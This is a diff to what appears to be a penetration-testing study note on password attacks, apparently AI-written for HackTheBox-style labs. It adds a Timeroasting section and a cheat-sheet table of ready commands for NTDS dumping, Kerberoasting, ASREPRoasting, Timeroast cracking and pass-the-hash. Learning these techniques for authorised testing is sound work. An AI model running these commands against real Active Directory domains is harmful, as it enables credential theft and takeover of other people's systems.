@@ -1,6 +1,6 @@
 # Password Attacks
 
-#passwordcracking #passwords #auth #authentication #hashcat #PassTheHash #PassTheTicket #Kerberos
+#passwordcracking #passwords #auth #authentication #hashcat #PassTheHash #PassTheTicket #Kerberos #Kerberoasting #ASREPRoasting #Timeroasting #DPAPI #NTDS #LSASS #GPP #CredentialHunting
 
 ## What is this?
 
@@ -12,23 +12,23 @@ Extract, capture, and crack credentials from Windows and Linux systems. Windows:
 
 | Tool | Purpose |
 |---|---|
-| `hashcat` | GPU-accelerated hash cracking |
-| `john` | CPU-based hash cracking |
-| `hydra` | Online brute-force (protocols) |
-| `crackmapexec` / `netexec` | SMB/AD spraying, hash passing |
-| `evil-winrm` | WinRM shell with hash auth |
-| `impacket-secretsdump` | Remote/local hash extraction |
-| `impacket-psexec` | PtH shell via SMB |
-| `mimikatz` | Windows credential extraction |
-| `Rubeus` | Kerberos ticket attacks |
-| `pypykatz` | Python mimikatz (parse LSASS dumps) |
-| `LaZagne` | Multi-platform cred harvester |
-| `mimipenguin` | Linux memory credential extraction |
-| `CeWL` | Wordlist from website keywords |
-| `username-anarchy` | Username permutation generator |
-| `keytabextract.py` | Extract hashes from Kerberos keytab |
-| `firefox_decrypt.py` | Decrypt Firefox saved passwords |
-| `PCredz` | Extract creds from network captures |
+| [[Tools/Auth/hashcat\|hashcat]] | GPU-accelerated hash cracking |
+| [[Tools/Auth/john the ripper\|john]] | CPU-based hash cracking (+ `*2john` converters) |
+| [[Tools/Auth/Hydra\|hydra]] | Online brute-force (protocols) |
+| [[Tools/Lateral Movement/NetExec\|netexec]] / [[Tools/Lateral Movement/crackmapexec\|crackmapexec]] | SMB/AD spraying, hash passing, `--ntds` |
+| [[Tools/Lateral Movement/Evil WinRM\|evil-winrm]] | WinRM shell with hash auth |
+| [[Tools/Credential Dumping/secretsdump\|impacket-secretsdump]] | Remote/local hash extraction |
+| [[Tools/Auth/impacket-psexec\|impacket-psexec]] | PtH shell via SMB |
+| [[Tools/Credential Dumping/mimikatz\|mimikatz]] | Windows credential extraction |
+| [[Tools/Lateral Movement/Rubeus\|Rubeus]] | Kerberos ticket attacks |
+| [[Tools/Credential Dumping/pypykatz\|pypykatz]] | Python mimikatz (parse LSASS dumps) |
+| [[Tools/Credential Dumping/LaZagne\|LaZagne]] | Multi-platform cred harvester |
+| [[Tools/Credential Dumping/mimipenguin\|mimipenguin]] | Linux memory credential extraction |
+| [[Tools/Web/CeWL\|CeWL]] | Wordlist from website keywords |
+| [[Tools/Auth/Username Anarchy\|username-anarchy]] | Username permutation generator |
+| [[Tools/Auth/keytabextract\|keytabextract.py]] | Extract hashes from Kerberos keytab |
+| [[Tools/Auth/Firefox Decrypt\|firefox_decrypt.py]] | Decrypt Firefox saved passwords |
+| [[Tools/Network/PCredz\|PCredz]] | Extract creds from network captures |
 
 ---
 
@@ -315,6 +315,23 @@ Rubeus.exe asreproast /nowrap /format:hashcat   # all vulnerable users
 # Windows — PowerView to enumerate vulnerable accounts first
 Get-DomainUser -UACFilter DONT_REQUIRE_PREAUTH | Select-Object SamAccountName
 ```
+
+### Timeroasting
+
+Abuses legacy **NTP** authentication: an unauthenticated client can request a signed time response for any computer account by RID, and the signature is an MD5 built from the account's password hash. Collect the response and crack it offline — **no domain credentials required**, and it works by default in modern AD. Targets **computer/trust accounts**, which ASREPRoast and Kerberoast don't reach.
+
+```bash
+# Secura's timeroast.py — harvest hashes over UDP/123
+sudo python3 timeroast.py <dc-ip> -o timeroast_hashes.txt
+# Output is hashcat mode 31300
+
+# Crack (mode 31300 = Timeroast MS-SNTP)
+hashcat -m 31300 timeroast_hashes.txt /usr/share/wordlists/rockyou.txt
+```
+
+> [!warning] Machine account passwords are 120-char random and effectively **uncrackable** — the win is **trust accounts** and **misconfigured/predictable** computer passwords (accounts set with a known password, or where rotation is disabled). Treat it as a last-resort or a hunt for the one badly-provisioned account, not a reliable roast.
+
+> [!tip] "Targeted Timeroasting" extends this to *user* accounts on some setups by abusing the same MS-SNTP signing — worth checking current tooling if the standard computer-account sweep comes up dry.
 
 ---
 
@@ -834,6 +851,7 @@ hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt
 | Dump NTDS.dit remotely | `crackmapexec smb 10.129.201.57 -u Administrator -p 'Password123' --ntds` |
 | Kerberoast | `impacket-GetUserSPNs domain.htb/user:pass -dc-ip <IP> -request -outputfile kb.txt` → `hashcat -m 13100 kb.txt rockyou.txt` |
 | ASREPRoast | `impacket-GetNPUsers domain.htb/ -no-pass -usersfile users.txt -format hashcat` → `hashcat -m 18200` |
+| Timeroast (computer/trust accts, no creds) | `python3 timeroast.py <dc-ip> -o t.txt` → `hashcat -m 31300 t.txt rockyou.txt` |
 | GPP cpassword decrypt | `gpp-decrypt 'CPASSWORD_VALUE'` |
 | Pass the Hash (Linux) | `impacket-psexec administrator@<IP> -hashes :<NTLM_HASH>` |
 | Pass the Hash (mimikatz) | `sekurlsa::pth /domain:X /user:Y /ntlm:<hash> /run:cmd` |
@@ -849,5 +867,5 @@ hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt
 ---
 
 *Created: 2026-02-27*
-*Updated: 2026-07-27*
-*Model: claude-sonnet-5*
+*Updated: 2026-07-31*
+*Model: claude-opus-5*
